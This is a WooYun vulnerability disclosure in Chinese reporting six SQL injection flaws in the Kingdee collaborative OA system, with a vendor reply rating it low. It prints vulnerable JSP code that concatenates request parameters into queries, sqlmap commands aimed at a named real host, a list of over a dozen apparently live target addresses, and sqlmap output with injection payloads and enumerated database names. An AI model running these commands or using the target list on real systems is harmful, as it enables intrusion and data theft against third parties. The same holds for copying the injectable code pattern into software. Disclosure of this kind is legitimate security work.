wybug_title: 金蝶协作办公系统存在六个高危SQL注射
wybug_detail:
漏洞详情 披露状态：   									2015-08-19：	细节已通知厂商并且等待厂商处理中									2015-08-20：	厂商已经确认，细节仅向厂商公开									2015-08-23：	细节向第三方安全合作伙伴开放									2015-10-14：	细节向核心白帽子及相关领域专家公开									2015-10-24：	细节向普通白帽子公开									2015-11-03：	细节向实习白帽子公开									2015-11-18：	细节向公众公开  简要描述： 金蝶协作办公系统存在六个高危SQL注射 详细说明：  存在漏洞的文件：
/kingdee/person/getClass.jsp?id=1/kingdee/person/note/note_opinion_submit.jsp?opinion_id=1/kingdee/pubinfo/chatlog_length.jsp?user_id=1&sendid=11%27))%20and%20A.sendid=1*/kingdee/pubinfo/chatlog_content.jsp?user_id=1&sendid=11%27))%20and%20A.sendid=1*/kingdee/pubinfo/news_comment_del.jsp?id=1/kingdee/test_tree/get_nodes.jsp?node=1
0x1  /kingdee/person/getClass.jsp 部分漏洞代码：
<%@ page language="java" import="java.util.*" contentType="text/html; charset=GBK"%><jsp:directive.page import="pub.PubFunc"/><%String sql="select menu_id,menu_name from basic_mainmenu where high_menu_id='"+PubFunc.toString(request.getParameter("id"))+"'";sysUtil.database.ResultData db = new sysUtil.database.ResultData();ArrayList<String[]> alist = db.open(sql);String wout="";for(int i =0;i<alist.size();i++){	if(i==0)		wout+=alist.get(i)[0]+"|"+alist.get(i)[1];	else		wout+=","+alist.get(i)[0]+"|"+alist.get(i)[1];}response.getWriter().print(wout);%>

sqlmap.py -u "http://oa.guanhao.com:8080/kingdee/person/getClass.jsp?id=1"


0x2  /kingdee/person/note/note_opinion_submit.jsp 部分漏洞代码：
<%@page contentType="text/HTML;charset=gbk"%><jsp:directive.page import="pub.PubFunc"/><jsp:directive.page import="pub.TableCtrl"/><jsp:directive.page import="java.util.Hashtable"/><jsp:directive.page import="sysUtil.web.WebInit"/><%String user_id=PubFunc.toString(session.getAttribute("user_id"));String note=PubFunc.toString(request.getParameter("note"));String opinion_id=PubFunc.toString(request.getParameter("opinion_id"));String diart_id=PubFunc.toString(request.getParameter("diart_id"));String isEdit=PubFunc.toString(request.getParameter("isEdit"));String notice_id=PubFunc.toString(request.getParameter("notice_id"));Hashtable ht=new Hashtable();if(!user_id.equals("")&&!diart_id.equals("")&&isEdit.equals("")){	ht.put("opinion_id",String.valueOf(WebInit.GET_INDEX_ID("last_opinion_id")));	ht.put("diary_id",diart_id);	ht.put("user_id",user_id);	ht.put("note",note);	ht.put("insert_date",PubFunc.getNow());	ht.put("modify_date","");	ht.put("notice_id",notice_id);	new TableCtrl().insertRow("person_diary_opinion",ht);	out.print("true");}else if(!opinion_id.equals("")){	ht.put("note",note);	ht.put("modify_date",PubFunc.getNow());	new TableCtrl().updateRow("person_diary_opinion",ht,"opinion_id="+opinion_id);	out.print("edit");}else{	out.print("false");}%>

sqlmap.py -u "http://oa.guanhao.com:8080/kingdee/person/note/note_opinion_submit.jsp?opinion_id=1"


0x3  /kingdee/pubinfo/chatlog_length.jsp/chatlog_content.jsp 部分漏洞代码：
<%	String user_id = request.getParameter("user_id");	String sendid = request.getParameter("sendid");	String dbstr=PubFunc.getDSChar();	if(user_id == null || user_id.equals(""))		return ;	int pagelen=0;	if(sendid.equals("all")){		pagelen = db.getRowCount("select sedtime from basic_oicq where receiveid='all' or (','"+dbstr+"receiveid"+dbstr+"',' like '%,all,%' and (','"+dbstr+"receiveid"+dbstr+"',' like '%,"+user_id+",%' or sendid='"+user_id+"'))order by sedtime desc");	}else{		pagelen = db.getRowCount("select B.user_name,A.msg,A.sedtime from basic_oicq A ,basic_user B where ((A.sendid='"+sendid+"' and A.receiveid='"+user_id+"') or (A.sendid='"+user_id+"' and A.receiveid='"+sendid+"')) and A.sendid=B.user_id order by A.sedtime");	}	out.print(pagelen);%>

sqlmap.py -u "http://oa.guanhao.com:8080/kingdee/pubinfo/chatlog_length.jsp?user_id=1&sendid=11%27))%20and%20A.sendid=1*"


0x4  /kingdee/pubinfo/news_comment_del.jsp 部分漏洞代码：
<%@page import="pub.TableCtrl"%><%String id=request.getParameter("id");new TableCtrl().exec("delete public_news_comment where id="+id);%>

sqlmap.py -u "http://oa.guanhao.com:8080/kingdee/pubinfo/news_comment_del.jsp?id=1"


0x5  /kingdee/test_tree/get_nodes.jsp 部分漏洞代码：
<%	String node_id = PubFunc.toString(request.getParameter("node"));	//	if(node_id.equals(""))	//	node_id="0";	//System.out.println(PubFunc.toString(request.getParameter("text")));	String str = "[";	TableCtrl db = new TableCtrl();	String sql = "";	sql = "select department_id,department_name from basic_org where high_department_id ="+node_id;//	sql = "select department_id,department_name from basic_org where high_department_id ="+node_id;	Vector vec = db.open(sql);

sqlmap.py -u "http://oa.guanhao.com:8080/kingdee/test_tree/get_nodes.jsp?node=1"


sqlmap测试的数据：
sqlmap.py -u "http://oa.guanhao.com:8080/kingdee/test_tree/get_nodes.jsp?node=1" --dbs


给出几个案例：
http://221.226.149.17:8080/kingdee/login/loginpage.jsphttp://122.139.60.103:800/kingdee/login/loginpage.jsphttp://oa.guanhao.com:8080/kingdee/login/loginpage.jsphttp://222.179.238.182:8082/kingdee/login/loginpage2.jsphttp://222.134.77.23:8080/kingdee/login/loginpage.jsphttp://221.4.245.218:8080/kingdee/login/loginpage.jsphttp://221.226.149.17:8080/kingdee/login/loginpage.jsphttp://220.189.244.202:8080/kingdee/login/loginpage.jsphttp://222.133.44.10:8080/kingdee/login/loginpage.jsphttp://223.95.183.6:8080/kingdee/login/loginpage.jsphttp://61.190.20.51/kingdee/login/loginpage.jsphttp://60.194.110.187/kingdee/login/loginpage.jsphttp://oa.roen.cn/kingdee/login/loginpage.jsp
   漏洞证明：  
sqlmap.py -u "http://oa.guanhao.com:8080/kingdee/test_tree/get_nodes.jsp?node=1"         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150423}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 22:29:56[22:29:56] [INFO] resuming back-end DBMS 'microsoft sql server' [22:29:56] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: node (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: node=1 AND 1673=1673    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: node=1;WAITFOR DELAY '0:0:5'--    Type: UNION query    Title: Generic UNION query (NULL) - 2 columns    Payload: node=1 UNION ALL SELECT NULL,CHAR(113)+CHAR(98)+CHAR(113)+CHAR(112)+CHAR(113)+CHAR(108)+CHAR(88)+CHAR(109)+CHAR(103)+CHAR(103)+CHAR(119)+CHAR(121)+CHAR(67)+CHAR(98)+CHAR(80)+CHAR(113)+CHAR(113)+CHAR(107)+CHAR(98)+CHAR(113)-- ---[22:29:57] [INFO] the back-end DBMS is Microsoft SQL Serverweb application technology: JSPback-end DBMS: Microsoft SQL Server 2005[22:29:57] [INFO] fetching database namesavailable databases [6]:[*] ghcoa[*] ghtest[*] master[*] model[*] msdb[*] tempdb[22:29:57] [INFO] fetched data logged to text files under 'C:\Users\Administrator\.sqlmap\output\oa.guanhao.com'[*] shutting down at 22:29:57
   修复方案：  过滤吧   版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2015-08-20 09:30 厂商回复： 谢谢对金蝶的关注，此产品为合作伙伴产品，我们已通知相关部门为客户修复。已经有很多此系统的上报漏洞，故rank给的低，请理解。 最新状态： 暂无
